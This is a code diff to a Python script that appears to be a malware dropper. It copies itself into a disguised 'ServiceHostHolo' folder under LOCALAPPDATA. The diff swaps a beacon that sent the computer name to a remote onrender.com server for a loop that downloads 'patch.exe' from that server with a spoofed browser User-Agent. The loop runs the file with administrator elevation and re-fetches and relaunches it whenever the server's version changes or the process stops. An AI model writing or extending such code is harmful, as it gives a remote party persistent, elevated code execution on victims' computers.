@@ -6,6 +6,7 @@ from pathlib import Path
 import time
 import shutil
 import ctypes
+import psutil
 def is_admin():
     """Returns True if the script is running with Admin privileges, False otherwise."""
     try:
@@ -46,12 +47,12 @@ def get_clean_exe_name():
 # --- Example Usage ---
 exe_itself = get_exe_self_path()
 exe_name = get_exe_name()
-
+local_app_data = os.environ.get("LOCALAPPDATA")
+target_dir = Path(local_app_data) / "ServiceHostHolo"
 
 def Injector():
     print("Injecting..")
-    local_app_data = os.environ.get("LOCALAPPDATA")
-    target_dir = Path(local_app_data) / "ServiceHostHolo"
+    
 
     target_dir.mkdir(parents=True, exist_ok=True)
     print(f"Folder ready at: {target_dir}")
@@ -134,6 +135,24 @@ def Injector():
         else:
             print(f"Failed to launch. Windows Error Code: {result}")
 
+    def kill_all_instances(exe_name):
+        """
+        Kills all running processes that match the executable name (e.g., 'notepad.exe')
+        """
+        # Ensure we have the base name if a full path was passed
+        target_name = os.path.basename(exe_name).lower()
+        
+        killed_count = 0
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                if proc.info['name'] and proc.info['name'].lower() == target_name:
+                    proc.terminate() # or proc.kill() for a hard kill
+                    killed_count += 1
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+                
+        print(f"Killed {killed_count} instance(s) of {target_name}.")
+
     if os.path.exists(target_dir / exactinjectname):
         print("Already Injected.")
         show_windows_error(
@@ -155,26 +174,150 @@ def Injector():
         )
 
 def RunMain():
-    import requests
-    fps = 30
-    URL = "https://anotherwebsite-x1gv.onrender.com/ping"
-    while True:
-        time.sleep(1/fps)
-        payload = {"pcname": os.environ.get("COMPUTERNAME")}
+    def launch_as_admin(exe_path):
+        # 'runas' forces Windows to launch the file with elevated Admin privileges
+        result = ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", str(exe_path), None, None, 1
+        )
+
+        # ShellExecuteW returns a value greater than 32 if it succeeded
+        if result > 32:
+            print("Successfully launched process as Administrator.")
+        else:
+            print(f"Failed to launch. Windows Error Code: {result}")
+
+    def kill_all_instances(exe_name):
+        """
+        Kills all running processes that match the executable name (e.g., 'notepad.exe')
+        """
+        # Ensure we have the base name if a full path was passed
+        target_name = os.path.basename(exe_name).lower()
+        
+        killed_count = 0
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                if proc.info['name'] and proc.info['name'].lower() == target_name:
+                    proc.terminate() # or proc.kill() for a hard kill
+                    killed_count += 1
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+                
+        print(f"Killed {killed_count} instance(s) of {target_name}.")
+    def process_exists(exe_name):
+        """
+        Checks if any running process matches the given executable name.
+        Returns True if found, False otherwise.
+        """
+        # Sanitize name to match base format (e.g., 'notepad.exe')
+        target_name = os.path.basename(exe_name).lower()
+        
+        for proc in psutil.process_iter(['name']):
+            try:
+                if proc.info['name'] and proc.info['name'].lower() == target_name:
+                    return True  # Found a match, exit early
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+                
+        return False  # No matches found anywhere
+    def download_patch(server_url, save_directory):
+        url = f"{server_url.rstrip('/')}/getpatch"
+        local_filename = os.path.join(save_directory, "patch.exe")
+        
+        # Fake a real Google Chrome browser request
+        custom_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive"
+        }
+        
         try:
-            # Send the POST request with the JSON data
-            response = requests.post(URL, json=payload)
-
-            # Check if the server responded successfully (Status 200)
+            print(f"Requesting patch from {url}...")
+            
+            # Pass the headers into the request
+            response = requests.get(url, stream=True, headers=custom_headers)
+            
             if response.status_code == 200:
-                # Parse the JSON response text from the server
-                server_reply = response.json()
-                print(server_reply.get("server_message"))
+                total_size = int(response.headers.get('content-length', 0))
+                bytes_downloaded = 0
+                
+                print(f"Expected file size: {total_size} bytes. Downloading...")
+                
+                with open(local_filename, "wb") as f:
+                    while True:
+                        chunk = response.raw.read(8192)
+                        if not chunk:
+                            break
+                        f.write(chunk)
+                        bytes_downloaded += len(chunk)
+                
+                print(f"Downloaded total: {bytes_downloaded} bytes.")
+                
+                if total_size != 0 and bytes_downloaded != total_size:
+                    print(f"[Error] Size mismatch! Got {bytes_downloaded}/{total_size} bytes.")
+                    if os.path.exists(local_filename):
+                        os.remove(local_filename)
+                    return None
+                    
+                print(f"[Success] Match verified. Saved to: {local_filename}")
+                return local_filename
             else:
-                print(f"Server returned an error code: {response.status_code}")
-
+                print(f"[Error] Server status: {response.status_code}")
+                return None
+                
         except Exception as e:
-            print(f"Failed to connect to server: {e}")
+            print(f"[Exception] Failed: {e}")
+            return None
+    def get_server_patch_version(server_url):
+        url = f"{server_url.rstrip('/')}/patch_number"
+        
+        try:
+            response = requests.get(url, timeout=5)
+            
+            if response.status_code == 200:
+                # CORRECTED: .json() is the proper method for the requests library
+                data = response.json()  
+                
+                server_version = str(data.get("patch_number", "")).strip()
+                return server_version
+            else:
+                print(f"[Error] Failed to check version. Server status: {response.status_code}")
+                return None
+                
+        except Exception as e:
+            print(f"[Exception] Could not connect to server to check version: {e}")
+            return None
+    import requests
+    willrestart = False
+    fps = 30
+    URL = "https://anotherwebsite-x1gv.onrender.com/"
+    patchpath = None
+    current_version = get_server_patch_version(URL)
+    while True:
+        if patchpath:
+            kill_all_instances(patchpath)
+            time.sleep(2)
+        patchpath = download_patch(URL,target_dir)
+        if patchpath:
+            launch_as_admin(patchpath)
+            print("patched")
+        else:
+            willrestart = True
+            print("failed to patch..")
+            time.sleep(1)
+        time.sleep(2)
+        while not willrestart:
+            time.sleep(10)
+            print("checking patch..")
+            latest_patch = get_server_patch_version(URL)
+            if latest_patch != current_version:
+                print("New patch update! restarting...")
+                current_version = latest_patch
+                willrestart = True
+            if not process_exists(patchpath):
+                print("Process doesn't exist. restarting...")
+                willrestart = True
+        willrestart = False
 
 if __name__ == "__main__":
     multiprocessing.freeze_support()
